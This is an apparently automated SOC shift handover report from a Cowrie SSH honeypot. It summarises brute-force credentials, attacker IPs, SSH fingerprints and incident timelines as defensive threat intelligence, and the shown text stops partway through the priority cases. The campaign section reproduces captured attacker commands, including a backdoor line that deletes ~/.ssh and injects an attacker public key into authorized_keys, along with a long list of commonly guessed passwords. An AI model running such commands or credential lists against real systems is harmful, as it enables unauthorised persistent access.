# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-12 |
| **Generated At** | 2026-07-12T19:11:33Z |
| **Shift Time** | 19:11 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **218** |
| Confirmed Threats | **201** |
| False Positives Filtered | **17** (7.8%) |
| Unique Attacker IPs | **65** |
| Countries of Origin | **20** |
| High Severity Cases | **158** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **60** |
| Malware Samples Analyzed | **4** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **195** |
| Unique Credential Pairs | **133** |
| Unique Usernames | **19** |
| Unique Passwords | **94** |
| Successful Auth Pairs | **176** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 77 |
| `test` | 26 |
| `admin` | 25 |
| `user` | 19 |
| `support` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `1q2w3e4r` | 7 |
| `admin` | 7 |
| `qwerty` | 6 |
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 6 |
| `test` | `qwerty123456` | 5 |
| `admin` | `admin` | 5 |
| `root` | `smo@@kkklss` | 4 |
| `support` | `support` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `test` | `1q2w3e4r` | `186.239.41.74` | 2026-07-12T16:56:04 |
| `postgres` | `data` | `91.92.40.176` | 2026-07-12T16:56:15 |
| `root` | `12345678` | `193.32.162.84` | 2026-07-12T16:56:35 |
| `root` | `1234567` | `195.178.110.232` | 2026-07-12T16:57:56 |
| `postgres` | `dbadmin` | `91.92.40.176` | 2026-07-12T16:58:24 |
| `root` | `123456789` | `193.32.162.84` | 2026-07-12T16:58:36 |
| `root` | `qazwsxedc18` | `185.242.3.195` | 2026-07-12T16:59:04 |
| `root` | `12345678` | `195.178.110.232` | 2026-07-12T16:59:40 |
| `user` | `123456` | `91.92.40.176` | 2026-07-12T17:00:45 |
| `root` | `1234567890` | `193.32.162.84` | 2026-07-12T17:01:02 |
| `root` | `123456789` | `195.178.110.232` | 2026-07-12T17:01:30 |
| `user` | `password` | `91.92.40.176` | 2026-07-12T17:03:06 |
| `root` | `1234567890` | `195.178.110.232` | 2026-07-12T17:03:17 |
| `test` | `qwerty123456` | `31.173.66.222` | 2026-07-12T17:03:33 |
| `root` | `123456a` | `193.32.162.84` | 2026-07-12T17:03:35 |
| `test` | `qwerty123456` | `80.65.90.155` | 2026-07-12T17:03:40 |
| `root` | `123456a` | `195.178.110.232` | 2026-07-12T17:05:18 |
| `user` | `user` | `91.92.40.176` | 2026-07-12T17:05:27 |
| `root` | `123456b` | `193.32.162.84` | 2026-07-12T17:05:45 |
| `test` | `qwerty123456` | `117.205.2.250` | 2026-07-12T17:06:59 |
| `test` | `qwerty123456` | `10.0.0.73` | 2026-07-12T17:07:22 |
| `root` | `123456b` | `195.178.110.232` | 2026-07-12T17:07:31 |
| `root` | `123abc` | `193.32.162.84` | 2026-07-12T17:07:53 |
| `user` | `12345` | `91.92.40.176` | 2026-07-12T17:07:53 |
| `root` | `1234abcd` | `195.178.110.232` | 2026-07-12T17:09:34 |
| `root` | `123qwe` | `193.32.162.84` | 2026-07-12T17:09:53 |
| `user` | `123456789` | `91.92.40.176` | 2026-07-12T17:10:07 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-12T17:10:09 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-12T17:10:09 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-12T17:10:13 |
| `root` | `123abc` | `195.178.110.232` | 2026-07-12T17:11:46 |
| `root` | `1q2w3e4r` | `193.32.162.84` | 2026-07-12T17:11:53 |
| `user` | `passw0rd` | `91.92.40.176` | 2026-07-12T17:12:19 |
| `test` | `webmaster` | `10.0.0.73` | 2026-07-12T17:12:56 |
| `support` | `support` | `176.53.159.196` | 2026-07-12T17:13:44 |
| `root` | `123qwe` | `195.178.110.232` | 2026-07-12T17:13:51 |
| `root` | `555555` | `193.32.162.84` | 2026-07-12T17:13:53 |
| `root` | `qazwsxedc18` | `10.0.0.73` | 2026-07-12T17:14:13 |
| `user` | `12345678` | `91.92.40.176` | 2026-07-12T17:14:38 |
| `support` | `support` | `10.0.0.73` | 2026-07-12T17:15:01 |
| `root` | `1q2w3e4r` | `195.178.110.232` | 2026-07-12T17:15:51 |
| `root` | `654321` | `193.32.162.84` | 2026-07-12T17:15:57 |
| `user` | `1234` | `91.92.40.176` | 2026-07-12T17:16:59 |
| `support` | `support33` | `103.31.38.92` | 2026-07-12T17:17:31 |
| `root` | `7777777` | `193.32.162.84` | 2026-07-12T17:17:57 |
| `root` | `1qaz2wsx` | `195.178.110.232` | 2026-07-12T17:17:59 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-12T17:18:59 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-12T17:18:59 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-12T17:19:08 |
| `user` | `qwerty` | `91.92.40.176` | 2026-07-12T17:19:29 |
| `root` | `1qaz@WSX` | `195.178.110.232` | 2026-07-12T17:19:56 |
| `root` | `abc123` | `193.32.162.84` | 2026-07-12T17:20:01 |
| `support` | `support33` | `50.187.155.130` | 2026-07-12T17:21:03 |
| `support` | `support33` | `196.219.93.108` | 2026-07-12T17:21:10 |
| `support` | `support33` | `10.0.0.73` | 2026-07-12T17:21:25 |
| `user` | `letmein` | `91.92.40.176` | 2026-07-12T17:21:56 |
| `root` | `admin` | `193.32.162.84` | 2026-07-12T17:22:00 |
| `root` | `21` | `195.178.110.232` | 2026-07-12T17:22:04 |
| `root` | `admin123` | `193.32.162.84` | 2026-07-12T17:24:00 |
| `user` | `123123` | `91.92.40.176` | 2026-07-12T17:24:07 |
| `root` | `321` | `195.178.110.232` | 2026-07-12T17:24:10 |
| `root` | `passw0rd` | `193.32.162.84` | 2026-07-12T17:25:58 |
| `user` | `123` | `91.92.40.176` | 2026-07-12T17:26:16 |
| `root` | `4321` | `195.178.110.232` | 2026-07-12T17:26:18 |
| `root` | `password` | `193.32.162.84` | 2026-07-12T17:27:58 |
| `root` | `54321` | `195.178.110.232` | 2026-07-12T17:28:21 |
| `user` | `welcome` | `91.92.40.176` | 2026-07-12T17:28:29 |
| `root` | `password1` | `193.32.162.84` | 2026-07-12T17:30:04 |
| `root` | `555555` | `195.178.110.232` | 2026-07-12T17:30:28 |
| `user` | `user123` | `91.92.40.176` | 2026-07-12T17:30:36 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-07-12T17:30:48 |
| `root` | `qwerty` | `193.32.162.84` | 2026-07-12T17:32:24 |
| `root` | `654321` | `195.178.110.232` | 2026-07-12T17:32:26 |
| `blank` | `qwerty` | `37.238.45.202` | 2026-07-12T17:32:39 |
| `user` | `default` | `91.92.40.176` | 2026-07-12T17:32:45 |
| `blank` | `qwerty` | `10.0.0.73` | 2026-07-12T17:33:06 |
| `root` | `pa76!pa7` | `185.242.3.195` | 2026-07-12T17:33:31 |
| `root` | `7777777` | `195.178.110.232` | 2026-07-12T17:34:09 |
| `user` | `account` | `91.92.40.176` | 2026-07-12T17:34:55 |
| `root` | `welcome` | `193.32.162.84` | 2026-07-12T17:35:17 |
| `root` | `Admin2026!` | `195.178.110.232` | 2026-07-12T17:35:56 |
| `user` | `member` | `91.92.40.176` | 2026-07-12T17:37:02 |
| `admin` | `000000` | `193.32.162.84` | 2026-07-12T17:37:18 |
| `root` | `P4ssw0rd` | `195.178.110.232` | 2026-07-12T17:37:56 |
| `cie` | `cie` | `10.0.0.73` | 2026-07-12T17:38:04 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-12T17:38:09 |
| `cie` | `3245gs5662d34` | `10.0.0.73` | 2026-07-12T17:38:11 |
| `test` | `5555555` | `94.205.250.78` | 2026-07-12T17:38:23 |
| `user` | `client` | `91.92.40.176` | 2026-07-12T17:39:12 |
| `admin` | `111111` | `193.32.162.84` | 2026-07-12T17:39:15 |
| `root` | `P4ssword` | `195.178.110.232` | 2026-07-12T17:39:42 |
| `admin` | `123` | `193.32.162.84` | 2026-07-12T17:41:12 |
| `test` | `123456` | `91.92.40.176` | 2026-07-12T17:41:21 |
| `root` | `P@ssw0rd` | `195.178.110.232` | 2026-07-12T17:41:37 |
| `admin` | `admin` | `47.77.216.159` | 2026-07-12T17:42:26 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-12T17:42:26 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-12T17:42:43 |
| `admin` | `123123` | `193.32.162.84` | 2026-07-12T17:43:14 |
| `admin` | `1qaz!QAZ` | `101.13.5.26` | 2026-07-12T17:43:27 |
| `root` | `P@ssw0rd2026` | `195.178.110.232` | 2026-07-12T17:43:27 |
| `test` | `password` | `91.92.40.176` | 2026-07-12T17:43:32 |
| `root` | `P@ssword` | `195.178.110.232` | 2026-07-12T17:45:26 |
| `admin` | `123321` | `193.32.162.84` | 2026-07-12T17:45:31 |
| `test` | `test` | `91.92.40.176` | 2026-07-12T17:45:47 |
| `admin` | `1qaz!QAZ` | `203.110.233.225` | 2026-07-12T17:46:40 |
| `admin` | `1qaz!QAZ` | `124.152.90.68` | 2026-07-12T17:46:49 |
| `root` | `Passw0rd` | `195.178.110.232` | 2026-07-12T17:47:13 |
| `test` | `12345` | `91.92.40.176` | 2026-07-12T17:48:02 |
| `admin` | `1234` | `193.32.162.84` | 2026-07-12T17:48:02 |
| `root` | `pa76!pa7` | `10.0.0.73` | 2026-07-12T17:48:41 |
| `root` | `Password1` | `195.178.110.232` | 2026-07-12T17:49:06 |
| `test` | `123456789` | `91.92.40.176` | 2026-07-12T17:50:14 |
| `admin` | `12345` | `193.32.162.84` | 2026-07-12T17:50:48 |
| `root` | `Root123` | `195.178.110.232` | 2026-07-12T17:51:04 |
| `test` | `passw0rd` | `91.92.40.176` | 2026-07-12T17:52:31 |
| `admin` | `123456` | `193.32.162.84` | 2026-07-12T17:52:47 |
| `root` | `abc123` | `195.178.110.232` | 2026-07-12T17:52:49 |
| `root` | `admin` | `195.178.110.232` | 2026-07-12T17:54:39 |
| `github` | `githubpass` | `49.0.24.107` | 2026-07-12T17:54:48 |
| `admin` | `1234567` | `193.32.162.84` | 2026-07-12T17:54:48 |
| `test` | `12345678` | `91.92.40.176` | 2026-07-12T17:54:51 |
| `345gs5662d34` | `345gs5662d34` | `49.0.24.107` | 2026-07-12T17:54:53 |
| `github` | `3245gs5662d34` | `49.0.24.107` | 2026-07-12T17:54:55 |
| `root` | `alpine` | `195.178.110.232` | 2026-07-12T17:56:33 |
| `admin` | `12345678` | `193.32.162.84` | 2026-07-12T17:56:39 |
| `test` | `1234` | `91.92.40.176` | 2026-07-12T17:57:06 |
| `root` | `changeme` | `195.178.110.232` | 2026-07-12T17:58:14 |
| `admin` | `123456789` | `193.32.162.84` | 2026-07-12T17:58:31 |
| `roberto` | `roberto` | `106.248.238.187` | 2026-07-12T17:58:42 |
| `test` | `qwerty` | `91.92.40.176` | 2026-07-12T17:59:31 |
| `root` | `default` | `195.178.110.232` | 2026-07-12T18:00:16 |
| `admin` | `1234567890` | `193.32.162.84` | 2026-07-12T18:00:23 |
| `test` | `letmein` | `91.92.40.176` | 2026-07-12T18:01:50 |
| `test` | `random` | `178.178.222.57` | 2026-07-12T18:04:10 |
| `test` | `123123` | `91.92.40.176` | 2026-07-12T18:04:13 |
| `test` | `random` | `211.23.109.116` | 2026-07-12T18:04:20 |
| `test` | `123` | `91.92.40.176` | 2026-07-12T18:06:34 |
| `root` | `ROOT123` | `185.242.3.195` | 2026-07-12T18:07:15 |
| `admin` | `admin` | `43.128.81.242` | 2026-07-12T18:08:33 |
| `test` | `testing` | `91.92.40.176` | 2026-07-12T18:08:54 |
| `test` | `root` | `121.128.84.224` | 2026-07-12T18:09:00 |
| `test` | `root` | `103.111.6.121` | 2026-07-12T18:09:13 |
| `test` | `test123` | `91.92.40.176` | 2026-07-12T18:11:17 |
| `root` | `` | `94.154.43.10` | 2026-07-12T18:15:14 |
| `root` | `Da123456` | `10.0.0.73` | 2026-07-12T18:17:41 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-12T18:17:46 |
| `root` | `ROOT123` | `10.0.0.73` | 2026-07-12T18:22:24 |
| `blank` | `p@ssword` | `185.112.148.66` | 2026-07-12T18:24:20 |
| `datax` | `datax` | `10.0.0.73` | 2026-07-12T18:24:26 |
| `datax` | `3245gs5662d34` | `10.0.0.73` | 2026-07-12T18:24:29 |
| `blank` | `p@ssword` | `10.0.0.73` | 2026-07-12T18:24:43 |
| `ubuntu` | `L@y3rh0st2023` | `10.0.0.73` | 2026-07-12T18:25:01 |
| `ubuntu` | `3245gs5662d34` | `10.0.0.73` | 2026-07-12T18:25:07 |
| `blank` | `987654321` | `50.217.255.171` | 2026-07-12T18:29:55 |
| `blank` | `987654321` | `188.226.132.113` | 2026-07-12T18:30:06 |
| `admin` | `987654321` | `34.41.211.48` | 2026-07-12T18:34:46 |
| `admin` | `987654321` | `182.75.227.178` | 2026-07-12T18:34:55 |
| `admin` | `987654321` | `112.27.38.203` | 2026-07-12T18:38:16 |
| `admin` | `987654321` | `10.0.0.73` | 2026-07-12T18:38:41 |
| `ubuntu` | `demo123456` | `185.242.3.195` | 2026-07-12T18:40:55 |
| `ubnt` | `1q2w3e4r` | `220.80.219.163` | 2026-07-12T18:46:40 |
| `ubnt` | `1q2w3e4r` | `110.14.192.20` | 2026-07-12T18:46:52 |
| `dev` | `12345` | `10.0.0.73` | 2026-07-12T18:48:42 |
| `dev` | `3245gs5662d34` | `10.0.0.73` | 2026-07-12T18:48:45 |
| `b'\xcc\xd1\xd1\xca'` | `b'\xe4\xca\xdb\x8b\x8c\x8f'` | `121.137.29.114` | 2026-07-12T18:49:00 |
| `lghkel	` | `zpz}ld	` | `121.137.29.114` | 2026-07-12T18:49:01 |
| `b'\xcc\xd1\xd1\xca'` | `b'\xc8\xd7\xc4\xc6\xc8'` | `121.137.29.114` | 2026-07-12T18:49:35 |
| `root` | `7ujMko0vizxv` | `121.137.29.114` | 2026-07-12T18:50:09 |
| `ubnt` | `1q2w3e4r` | `61.145.181.7` | 2026-07-12T18:50:14 |
| `b'\xcc\xd1\xd1\xca'` | `b'\xcc\xd1\xd1\xca'` | `121.137.29.114` | 2026-07-12T18:50:43 |
| `ubnt` | `1q2w3e4r` | `10.0.0.73` | 2026-07-12T18:50:45 |
| `admin` | `epicrouter` | `121.137.29.114` | 2026-07-12T18:51:51 |
| `b'\xdf\xda\xd3\xd7\xd0'` | `b'\x8f\x8c\x8d\x8a\x8b\x88'` | `121.137.29.114` | 2026-07-12T18:52:25 |
| `root` | `xmhdipc` | `121.137.29.114` | 2026-07-12T18:53:00 |
| `default` | `OxhlwSG8` | `121.137.29.114` | 2026-07-12T18:53:34 |
| `user` | `user` | `121.137.29.114` | 2026-07-12T18:54:08 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **218** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 110 |
| OpenSSH | 33 |
| Paramiko (Python) | 8 |
| libssh | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 99 | 3 |
| `acaa53e0a7d7...` | Mirai/variant | 26 | 26 |
| `a2de0f306611...` | Mirai/variant | 8 | 2 |
| `16443846184e...` | Generic scanner | 7 | 1 |
| `f555226df196...` | Mirai/variant | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 99 | 3 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 26 | 26 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 8 | 2 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 7 | 1 | Generic scanner |
| `95420f9d932d...` | OpenSSH | 7 | 3 | — |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `19532158b559...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 98 | 3 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.232`, `91.92.40.176`, `193.32.162.84`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.10`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `49.0.24.107`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **65** |
| Unique ASNs | **45** |
| High-Risk ASNs | **38** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 6 | MEDIUM |
| `AS22773` | Cox Communications Inc. | 6 | MEDIUM |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS25159` | PJSC MegaFon | 2 | HIGH |
| `AS7922` | Comcast Cable Communications, LLC | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (158)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-287b49d45eb8

| Field | Detail |
|---|---|
| **Source IP** | `186.239.41[.]74` |
| **First Seen** | 2026-07-12 16:56 |
| **Last Seen** | 2026-07-12 16:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 16:56:01` | `cowrie.session.connect` |
| `2026-07-12 16:56:02` | `cowrie.client.version` |
| `2026-07-12 16:56:02` | `cowrie.client.kex` |
| `2026-07-12 16:56:04` | `cowrie.login.success` |
| `2026-07-12 16:56:04` | `cowrie.direct-tcpip.request` |
| `2026-07-12 16:56:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.239.41[.]74` to AbuseIPDB if not already reported
- [ ] Block `186.239.41[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4aec2820298f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 16:56 |
| **Last Seen** | 2026-07-12 16:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 16:56:14` | `cowrie.session.connect` |
| `2026-07-12 16:56:14` | `cowrie.client.version` |
| `2026-07-12 16:56:14` | `cowrie.client.kex` |
| `2026-07-12 16:56:15` | `cowrie.login.success` |
| `2026-07-12 16:56:16` | `cowrie.session.params` |
| `2026-07-12 16:56:16` | `cowrie.command.input` |
| `2026-07-12 16:56:16` | `cowrie.command.input` |
| `2026-07-12 16:56:16` | `cowrie.command.input` |
| `2026-07-12 16:56:16` | `cowrie.command.input` |
| `2026-07-12 16:56:16` | `cowrie.command.input` |
| `2026-07-12 16:56:16` | `cowrie.command.success` |
| `2026-07-12 16:56:16` | `cowrie.command.input` |
| `2026-07-12 16:56:16` | `cowrie.command.input` |
| `2026-07-12 16:56:16` | `cowrie.command.input` |
| `2026-07-12 16:56:16` | `cowrie.command.input` |
| `2026-07-12 16:56:16` | `cowrie.log.closed` |
| `2026-07-12 16:56:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d12fb82ad3ef

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 16:56 |
| **Last Seen** | 2026-07-12 16:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 16:56:33` | `cowrie.session.connect` |
| `2026-07-12 16:56:33` | `cowrie.client.version` |
| `2026-07-12 16:56:33` | `cowrie.client.kex` |
| `2026-07-12 16:56:35` | `cowrie.login.success` |
| `2026-07-12 16:56:36` | `cowrie.session.params` |
| `2026-07-12 16:56:36` | `cowrie.command.input` |
| `2026-07-12 16:56:36` | `cowrie.command.input` |
| `2026-07-12 16:56:36` | `cowrie.command.input` |
| `2026-07-12 16:56:36` | `cowrie.command.input` |
| `2026-07-12 16:56:36` | `cowrie.command.input` |
| `2026-07-12 16:56:36` | `cowrie.command.success` |
| `2026-07-12 16:56:36` | `cowrie.command.input` |
| `2026-07-12 16:56:36` | `cowrie.command.input` |
| `2026-07-12 16:56:36` | `cowrie.command.input` |
| `2026-07-12 16:56:36` | `cowrie.command.input` |
| `2026-07-12 16:56:37` | `cowrie.log.closed` |
| `2026-07-12 16:56:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86d935429cee

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 16:57 |
| **Last Seen** | 2026-07-12 16:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 16:57:53` | `cowrie.session.connect` |
| `2026-07-12 16:57:54` | `cowrie.client.version` |
| `2026-07-12 16:57:54` | `cowrie.client.kex` |
| `2026-07-12 16:57:56` | `cowrie.login.success` |
| `2026-07-12 16:57:57` | `cowrie.session.params` |
| `2026-07-12 16:57:57` | `cowrie.command.input` |
| `2026-07-12 16:57:57` | `cowrie.command.input` |
| `2026-07-12 16:57:57` | `cowrie.command.input` |
| `2026-07-12 16:57:57` | `cowrie.command.input` |
| `2026-07-12 16:57:57` | `cowrie.command.input` |
| `2026-07-12 16:57:57` | `cowrie.command.success` |
| `2026-07-12 16:57:57` | `cowrie.command.input` |
| `2026-07-12 16:57:57` | `cowrie.command.input` |
| `2026-07-12 16:57:57` | `cowrie.command.input` |
| `2026-07-12 16:57:57` | `cowrie.command.input` |
| `2026-07-12 16:57:58` | `cowrie.log.closed` |
| `2026-07-12 16:57:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41765ba0aca8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 16:58 |
| **Last Seen** | 2026-07-12 16:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
